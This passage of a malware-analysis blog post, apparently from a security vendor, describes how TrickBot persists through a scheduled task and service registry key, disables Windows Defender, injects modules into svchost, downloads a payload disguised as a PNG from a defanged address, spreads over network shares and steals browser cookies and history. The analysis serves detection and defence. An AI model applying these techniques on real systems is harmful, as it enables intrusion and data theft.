<div>&nbsp;<img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-7.png?width=971&amp;name=triple-threat-blog-7.png" alt="TrickBot’s installation folder" width="971" loading="lazy" style="width: 971px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-7.png?width=486&amp;name=triple-threat-blog-7.png 486w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-7.png?width=971&amp;name=triple-threat-blog-7.png 971w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-7.png?width=1457&amp;name=triple-threat-blog-7.png 1457w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-7.png?width=1942&amp;name=triple-threat-blog-7.png 1942w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-7.png?width=2428&amp;name=triple-threat-blog-7.png 2428w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-7.png?width=2913&amp;name=triple-threat-blog-7.png 2913w" sizes="(max-width: 971px) 100vw, 971px"></div>
<p style="text-align: center;"><em>TrickBot’s installation folder.</em></p>
<p><em>settings.ini</em> is an obfuscated file that contains an encoded BotKey. This BotKey is generated uniquely per machine. We were able to <a href="https://www.google.com/url?q=https://github.com/hasherezade/malware_analysis/tree/master/trickbot&amp;sa=D&amp;ust=1554143122701000">extract the BotKey and decrypt</a> the modules and their configuration files.&nbsp;</p>
<div><img src="https://lh4.googleusercontent.com/F_s2EDX9mNTLJabFTJXHAAxWhAK3pova0TRwQGXunDc_OH1wsQLxiCzmIR_AAQSaXY1FsdWdymCWq1qd1mtj3iYyr2NaiK4QT55u5CI3IukWATlYd6jbVb7aij-leucxRTt12wye" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p style="text-align: center;"><em><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-8.png?width=1276&amp;name=triple-threat-blog-8.png" alt="contents of settings.ini" width="1276" loading="lazy" style="width: 1276px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-8.png?width=638&amp;name=triple-threat-blog-8.png 638w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-8.png?width=1276&amp;name=triple-threat-blog-8.png 1276w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-8.png?width=1914&amp;name=triple-threat-blog-8.png 1914w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-8.png?width=2552&amp;name=triple-threat-blog-8.png 2552w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-8.png?width=3190&amp;name=triple-threat-blog-8.png 3190w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-8.png?width=3828&amp;name=triple-threat-blog-8.png 3828w" sizes="(max-width: 1276px) 100vw, 1276px"></em></p>
<p style="text-align: center;"><em>The contents of settings.ini.</em></p>
<p>The <em>Data</em> folder contains the encrypted malicious modules along with their configuration files.&nbsp;</p>
<div><img src="https://lh3.googleusercontent.com/yTVv4I-qA51peGv-SaczZmtz3G9kq08BsOoiAcZ0Sf6ca8ybSxxED4ztAHp3Dp6hSExZ1A94o94haV7IonuDvVeSRx6H7B5R9svuxtQLolqY8hT1rwjM6DygbNFYfUOLrgNZqLZb" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p style="text-align: center;"><em><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-9.png?width=482&amp;name=triple-threat-blog-9.png" alt="Data folder" width="482" loading="lazy" style="width: 482px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-9.png?width=241&amp;name=triple-threat-blog-9.png 241w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-9.png?width=482&amp;name=triple-threat-blog-9.png 482w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-9.png?width=723&amp;name=triple-threat-blog-9.png 723w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-9.png?width=964&amp;name=triple-threat-blog-9.png 964w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-9.png?width=1205&amp;name=triple-threat-blog-9.png 1205w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-9.png?width=1446&amp;name=triple-threat-blog-9.png 1446w" sizes="(max-width: 482px) 100vw, 482px"></em></p>
<p style="text-align: center;"><em>The contents of the Data folder.</em></p>
<p>&nbsp;In order to ensure persistence, TrickBot creates a scheduled task and a service. The scheduled tasks name is dependent on the variant of the malware; in this case it is named \NetvalTask.&nbsp;</p>
<div><img src="https://lh3.googleusercontent.com/bZ_IxDyVdWmKwYMMBWgq0dSzMnrPkh42eNz9W4_4ULfm4x0RXt4Cxh2r5dPLatY8KDzC-A7TDUqirn5KfuUESecnLzQPTtVSr4eA4jKLNHjcpKyDO2J1UibQxERfTd348maxWv0z" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p style="text-align: center;"><em><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-10.png?width=699&amp;name=triple-threat-blog-10.png" alt="TrickBot persistence using a scheduled task" width="699" loading="lazy" style="width: 699px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-10.png?width=350&amp;name=triple-threat-blog-10.png 350w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-10.png?width=699&amp;name=triple-threat-blog-10.png 699w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-10.png?width=1049&amp;name=triple-threat-blog-10.png 1049w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-10.png?width=1398&amp;name=triple-threat-blog-10.png 1398w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-10.png?width=1748&amp;name=triple-threat-blog-10.png 1748w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-10.png?width=2097&amp;name=triple-threat-blog-10.png 2097w" sizes="(max-width: 699px) 100vw, 699px"></em></p>
<p style="text-align: center;"><em>TrickBot persistence using a scheduled task.</em></p>
<p>The service registry entry name is randomly generated and located under the services hive (</p>
<p><em>\HKLM\System\CurrentControlSet\Services\{Random_name}\imagePath)</em>.</p>
<p style="text-align: center;"><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-11.png?width=437&amp;name=triple-threat-blog-11.png" alt="TrickBot persistence using the registry key" width="437" loading="lazy" style="width: 437px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-11.png?width=219&amp;name=triple-threat-blog-11.png 219w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-11.png?width=437&amp;name=triple-threat-blog-11.png 437w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-11.png?width=656&amp;name=triple-threat-blog-11.png 656w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-11.png?width=874&amp;name=triple-threat-blog-11.png 874w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-11.png?width=1093&amp;name=triple-threat-blog-11.png 1093w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-11.png?width=1311&amp;name=triple-threat-blog-11.png 1311w" sizes="(max-width: 437px) 100vw, 437px"></p>
<p style="text-align: center;"><em>TrickBot persistence using the registry key.</em></p>
<p>The malicious modules are reflectively injected into legitimate processes including svchost in order to evade detection. In order to reduce the likelihood of being detected by an antimalware product, TrickBot tries to disable and delete Windows Defender.</p>
<p><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-12.png?width=701&amp;name=triple-threat-blog-12.png" alt="process flow of how TrickBot disables Windows Defender" width="701" loading="lazy" style="width: 701px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-12.png?width=351&amp;name=triple-threat-blog-12.png 351w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-12.png?width=701&amp;name=triple-threat-blog-12.png 701w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-12.png?width=1052&amp;name=triple-threat-blog-12.png 1052w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-12.png?width=1402&amp;name=triple-threat-blog-12.png 1402w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-12.png?width=1753&amp;name=triple-threat-blog-12.png 1753w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-12.png?width=2103&amp;name=triple-threat-blog-12.png 2103w" sizes="(max-width: 701px) 100vw, 701px"></p>
<div><img src="https://lh6.googleusercontent.com/zadvvmIzTk4duRi4wd0x6PoHj4FfXjLpzkfnVFrbwjUShAsZLkTrdiVQ7apm93_pYF_6K133aWCpfwVcKQ9jR26y6B80UO6z8AfGtNYowpBCUwLxldy5yPP2zUiTlYI7B_Iodg6N" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p style="text-align: center;"><em>The Cybereason Platform shows the process flow of how TrickBot disables Windows Defender.</em></p>
<h3>Loading and Running TrickBot’s Malicious Modules</h3>
<p>The malicious modules are reflectively loaded into svchost. Below are descriptions of the modules and how they fit and fulfil their role in TrickBot’s malicious activity.</p>
<div><img src="https://lh5.googleusercontent.com/qV6HWlHwGGs48VnK1pp5gvV9d_7y1hddWsJ7oILsN0bTJFgNnJ3XSoTQzWpgl3c_t-SZPJD4CvotZd9BYv5QkWNi5uAXLNaeyubglFL6rHSwhlqKPsuJPeYtEoUCfioAUCK_isN1" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p style="text-align: center;"><em><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-13.png?width=427&amp;name=triple-threat-blog-13.png" alt="TrickBot modules reflectively loaded into svchost" width="427" loading="lazy" style="width: 427px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-13.png?width=214&amp;name=triple-threat-blog-13.png 214w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-13.png?width=427&amp;name=triple-threat-blog-13.png 427w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-13.png?width=641&amp;name=triple-threat-blog-13.png 641w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-13.png?width=854&amp;name=triple-threat-blog-13.png 854w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-13.png?width=1068&amp;name=triple-threat-blog-13.png 1068w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-13.png?width=1281&amp;name=triple-threat-blog-13.png 1281w" sizes="(max-width: 427px) 100vw, 427px"></em></p>
<p style="text-align: center;"><em>TrickBot modules reflectively loaded into svchost.</em>&nbsp;</p>
<h4>module64.dll</h4>
<p>module64.dll is the TrickBot dropper. It downloads the TrickBot loader mswvc.exe (<em>SHA1: f84e0f022a0a263146e94ae3dd38cb5a8534fbfa</em>) and installs it locally or shared on the network for lateral movement.</p>
<p>&nbsp;Note: This writeup renames mswvc.exe to trickbot.exe to facilitate the understanding of the attack (SHA1: d6ee45108278bc13df1bdcc6280f4daba11e05c5).</p>
<p>The module makes a connection over HTTP to a hardcoded address. From there, it creates a file locally with a payload masquerading as a PNG file. In this instance, the malware connected and dumped the contents of the PNG file locally from http://192.161.54[.]60/radiance.png.</p>
<p><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-14.png?width=977&amp;name=triple-threat-blog-14.png" alt="distribution server and download of the payload" width="977" loading="lazy" style="width: 977px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-14.png?width=489&amp;name=triple-threat-blog-14.png 489w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-14.png?width=977&amp;name=triple-threat-blog-14.png 977w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-14.png?width=1466&amp;name=triple-threat-blog-14.png 1466w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-14.png?width=1954&amp;name=triple-threat-blog-14.png 1954w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-14.png?width=2443&amp;name=triple-threat-blog-14.png 2443w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-14.png?width=2931&amp;name=triple-threat-blog-14.png 2931w" sizes="(max-width: 977px) 100vw, 977px"><img src="https://lh3.googleusercontent.com/HsT6XyZTKt_Joct_grUO0SGdybZznpIclDRmUL5u57Ns9oTffbYCIxOmWtBFdyoU8Tb4ZUukyinVsvTIIQya-EcZYjaCFRxfYNpDNTZYY9VadiMhf9Ncl_6TgpQ6Xxugx2aFAzca" alt="" style="display: block; margin-left: auto; margin-right: auto;">&nbsp;</p>
<p style="text-align: center;"><em>Connection to the distribution server and download of the payload as shown in the Cybereason Platform.</em></p>
<p>The module receives the contents of the PNG payload and writes it to a local file on the machine. The module copies it to network shares to spread and improve lateral movement.&nbsp;</p>
<div><img src="https://lh6.googleusercontent.com/Kh4uvPZFFTw_LtqVNPLuhpb8wL0-hQrqvYBCyjB7JtQzDnUxM6tF7EaX8GvFRgLlr9hj8WE8sxxt96-Lk58eV46NsHt_VeoGKCZlwwnniGjyCYz9wU1AdDIt_AB9jWFvxlbueSYU" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p style="text-align: center;"><em><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-15.png?width=315&amp;name=triple-threat-blog-15.png" alt="Network shares folders that TrickBot uses to spread" width="315" loading="lazy" style="width: 315px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-15.png?width=158&amp;name=triple-threat-blog-15.png 158w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-15.png?width=315&amp;name=triple-threat-blog-15.png 315w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-15.png?width=473&amp;name=triple-threat-blog-15.png 473w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-15.png?width=630&amp;name=triple-threat-blog-15.png 630w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-15.png?width=788&amp;name=triple-threat-blog-15.png 788w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-15.png?width=945&amp;name=triple-threat-blog-15.png 945w" sizes="(max-width: 315px) 100vw, 315px"></em></p>
<p style="text-align: center;"><em>Network shares folders that TrickBot uses to spread. </em></p>
<p>The dropped file is registered as an auto-start service to give TrickBot persistence and a foothold on the target machine. This service can have any one of the display names in the figure below.</p>
<div><img src="https://lh4.googleusercontent.com/uTw2iEJRYAvqAZKif5TYLO3NQiCzRHWIeNpUJBKK0THwHqINklw3Sz07eks2WiblxcKJCoBtTmrmApeuzSowac8AQA6mi1XDNntDBY6VXyKMUsjA10h433zQ6tUGget6Y9r5h4iH" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p style="text-align: center;"><em><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-16.png?width=166&amp;name=triple-threat-blog-16.png" alt="Service display name" width="166" loading="lazy" style="width: 166px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-16.png?width=83&amp;name=triple-threat-blog-16.png 83w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-16.png?width=166&amp;name=triple-threat-blog-16.png 166w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-16.png?width=249&amp;name=triple-threat-blog-16.png 249w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-16.png?width=332&amp;name=triple-threat-blog-16.png 332w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-16.png?width=415&amp;name=triple-threat-blog-16.png 415w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-16.png?width=498&amp;name=triple-threat-blog-16.png 498w" sizes="(max-width: 166px) 100vw, 166px"></em></p>
<p style="text-align: center;"><em>Service display names.</em></p>
<p style="text-align: center;"><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-17.png?width=994&amp;name=triple-threat-blog-17.png" alt="Service creation" width="994" loading="lazy" style="width: 994px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-17.png?width=497&amp;name=triple-threat-blog-17.png 497w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-17.png?width=994&amp;name=triple-threat-blog-17.png 994w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-17.png?width=1491&amp;name=triple-threat-blog-17.png 1491w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-17.png?width=1988&amp;name=triple-threat-blog-17.png 1988w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-17.png?width=2485&amp;name=triple-threat-blog-17.png 2485w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-17.png?width=2982&amp;name=triple-threat-blog-17.png 2982w" sizes="(max-width: 994px) 100vw, 994px"></p>
<p style="text-align: center;"><em>Service creation.</em></p>
<h4 style="font-size: 30px; line-height: 1.75;">module.dll</h4>
<p>module.dll steals data from the browser, including cookies, HTML5 local storage, browsing history, Flash Local Shared Objects, and URL hits. TrickBot injects module.dll into svchost, which creates a hidden virtual instance of the victim's desktop. It harvests browser data by creating a tunnel and listening to the connections through other svchost processes that were also injected with module.dll, and are listening on the same ports.&nbsp;</p>
<div><img src="https://lh6.googleusercontent.com/27J7GmofnxLa_4a0kl_42PPN2YzGMbYQChMzqs-4X0gxKcV2t8EZ19YHKBDxn4Pzs1lytZ2m5ZRWl5yz8Q59SCWVf349Nazbiuv6LD2bEBO_twc6K-6hLxFqN_08qkYAETyCcq0-" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p style="text-align: center;"><em><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-18.png?width=295&amp;name=triple-threat-blog-18.png" alt="module.dll injected into svchost.exe" width="295" loading="lazy" style="width: 295px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-18.png?width=148&amp;name=triple-threat-blog-18.png 148w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-18.png?width=295&amp;name=triple-threat-blog-18.png 295w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-18.png?width=443&amp;name=triple-threat-blog-18.png 443w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-18.png?width=590&amp;name=triple-threat-blog-18.png 590w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-18.png?width=738&amp;name=triple-threat-blog-18.png 738w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-18.png?width=885&amp;name=triple-threat-blog-18.png 885w" sizes="(max-width: 295px) 100vw, 295px"></em></p>
<p style="text-align: center;"><em>module.dll injected into svchost.exe.</em></p>
<p style="text-align: center;"><em><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-19.png?width=429&amp;name=triple-threat-blog-19.png" alt="Proxy tunneling of explorer browser" width="429" loading="lazy" style="width: 429px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-19.png?width=215&amp;name=triple-threat-blog-19.png 215w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-19.png?width=429&amp;name=triple-threat-blog-19.png 429w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-19.png?width=644&amp;name=triple-threat-blog-19.png 644w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-19.png?width=858&amp;name=triple-threat-blog-19.png 858w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-19.png?width=1073&amp;name=triple-threat-blog-19.png 1073w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-19.png?width=1287&amp;name=triple-threat-blog-19.png 1287w" sizes="(max-width: 429px) 100vw, 429px"></em><img src="https://lh4.googleusercontent.com/SAhQb4XxT9nVxEwBVHv-iAmzvekVFiJU63x6uPIlYGtDocTwB0Oef216frLL2WB0t-vwTCglWhvawoWaQmpRL4HnZSV7Ba5p9BRB13kvcyjzauOrdkDcx5-Fxud0MRECktaX7pva" alt="" style="display: block; margin-left: auto; margin-right: auto;"></p>
<p style="text-align: center;"><em>Proxy tunneling of explorer browser.</em></p>
<p style="text-align: center;"><em><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-20.png?width=338&amp;name=triple-threat-blog-20.png" alt="Injected svchost listening on the same port" width="338" loading="lazy" style="width: 338px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-20.png?width=169&amp;name=triple-threat-blog-20.png 169w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-20.png?width=338&amp;name=triple-threat-blog-20.png 338w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-20.png?width=507&amp;name=triple-threat-blog-20.png 507w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-20.png?width=676&amp;name=triple-threat-blog-20.png 676w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-20.png?width=845&amp;name=triple-threat-blog-20.png 845w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-20.png?width=1014&amp;name=triple-threat-blog-20.png 1014w" sizes="(max-width: 338px) 100vw, 338px"></em><img src="https://lh6.googleusercontent.com/pzC7lfpQa-zzWKHhHibS_ojdvai3K7DOaqTb0ZfNWODaWGbOrdDEUHn0zqgICZ_EVuPFqO5j8rSxcXL1ZuAmiLV5HWYxwrVHB7_kjr_WRpf8jV8hb6C0JL7ADIjEviN2DExv4h9Z" alt="" style="display: block; margin-left: auto; margin-right: auto;"></p>
<p style="text-align: center;"><em>Injected svchost listening on the same port. </em></p>
<p>This module uses different artifacts that store sensitive data including registry entry, browser plugins, and a hard-coded SQLite database that retrieves and steals data from locally stored databases.</p>
<div><img src="https://lh6.googleusercontent.com/MGxU8wtS23mMXhj88vatbuQpAb_AgLUNxuwmFVbuWMhiaAGNpSN7MqWjt8LHhJppbKIgt5Vo3oy8HB_PGQy4qRH61Jv-aMUjNnbQ4xWxMxoN2Xf7cGnoe6g4mhqj6s_X4mnCHC92" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p style="text-align: center;"><em><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-21.png?width=755&amp;name=triple-threat-blog-21.png" alt="Browser registry entries hard-coded into module.dll" width="755" loading="lazy" style="width: 755px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-21.png?width=378&amp;name=triple-threat-blog-21.png 378w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-21.png?width=755&amp;name=triple-threat-blog-21.png 755w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-21.png?width=1133&amp;name=triple-threat-blog-21.png 1133w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-21.png?width=1510&amp;name=triple-threat-blog-21.png 1510w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-21.png?width=1888&amp;name=triple-threat-blog-21.png 1888w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-21.png?width=2265&amp;name=triple-threat-blog-21.png 2265w" sizes="(max-width: 755px) 100vw, 755px"></em></p>
<p style="text-align: center;"><em>Browser registry entries hard-coded into module.dll.</em></p>
<p style="text-align: center;"><em><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-22.png?width=697&amp;name=triple-threat-blog-22.png" alt="SQLite is used to retrieve and steal cookies" width="697" loading="lazy" style="width: 697px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-22.png?width=349&amp;name=triple-threat-blog-22.png 349w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-22.png?width=697&amp;name=triple-threat-blog-22.png 697w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-22.png?width=1046&amp;name=triple-threat-blog-22.png 1046w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-22.png?width=1394&amp;name=triple-threat-blog-22.png 1394w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-22.png?width=1743&amp;name=triple-threat-blog-22.png 1743w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-22.png?width=2091&amp;name=triple-threat-blog-22.png 2091w" sizes="(max-width: 697px) 100vw, 697px"></em><img src="https://lh5.googleusercontent.com/wajGKt7-ZVm_F8V_7nJ1Gj98_sLS9FnUULSB2lUImw-KbB3jzex5BIAUxCe_yLv65Abb3pHjvTo_XV6O9SUXDCRkoShEMdTZ-3ut3IX8UMf1KzvYs2Wq4MReS5xBjI3qhmkbaglS" alt="" style="display: block; margin-left: auto; margin-right: auto;"></p>
<p style="text-align: center;"><em>SQLite is used to retrieve and steal cookies.</em></p>
<p style="text-align: center;"><em><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-23.png?width=207&amp;name=triple-threat-blog-23.png" alt="Information gathering on the installed plugins" width="207" loading="lazy" style="width: 207px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-23.png?width=104&amp;name=triple-threat-blog-23.png 104w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-23.png?width=207&amp;name=triple-threat-blog-23.png 207w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-23.png?width=311&amp;name=triple-threat-blog-23.png 311w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-23.png?width=414&amp;name=triple-threat-blog-23.png 414w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-23.png?width=518&amp;name=triple-threat-blog-23.png 518w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-23.png?width=621&amp;name=triple-threat-blog-23.png 621w" sizes="(max-width: 207px) 100vw, 207px"></em><img src="https://lh3.googleusercontent.com/XC1evzodHEoHox2IQi5lUHgWOOlY27YfSeeZuwRuU63S7Uk4swhn6NQZPlH1jIMif7T2iF8PidOfodNGBzoO9H9VFk3VfhWScTIbuPcJ5qs2IEmjEn8312eSSyYaoBM_oa3T0n0O" alt="" style="display: block; margin-left: auto; margin-right: auto;"></p>
<p style="text-align: center;"><em>Information gathering on the installed plugins.</em></p>
<p>The following images were also hardcoded in Base64-encoding in module.dll.&nbsp;</p>
